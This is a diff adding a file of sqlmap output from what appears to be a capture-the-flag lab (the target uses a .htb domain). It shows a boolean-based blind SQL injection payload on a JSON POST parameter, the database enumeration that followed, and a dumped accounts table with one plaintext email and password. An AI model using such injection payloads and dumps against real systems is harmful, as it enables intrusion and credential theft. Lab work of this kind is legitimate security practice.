@@ -1,0 +1,54 @@
+sqlmap identified the following injection point(s) with a total of 118 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: {"id":"-5333 OR 5249=5249"}
+---
+back-end DBMS: MySQL >= 8.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: {"id":"-5333 OR 5249=5249"}
+---
+back-end DBMS: MySQL 8
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: {"id":"-5333 OR 5249=5249"}
+---
+back-end DBMS: MySQL 8
+Database: soccer_db
+[1 table]
++----------+
+| accounts |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: {"id":"-5333 OR 5249=5249"}
+---
+back-end DBMS: MySQL 8
+Database: soccer_db
+Table: accounts
+[1 entry]
++------+-------------------+----------+----------------------+
+| id   | email             | username | password             |
++------+-------------------+----------+----------------------+
+| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
++------+-------------------+----------+----------------------+
+
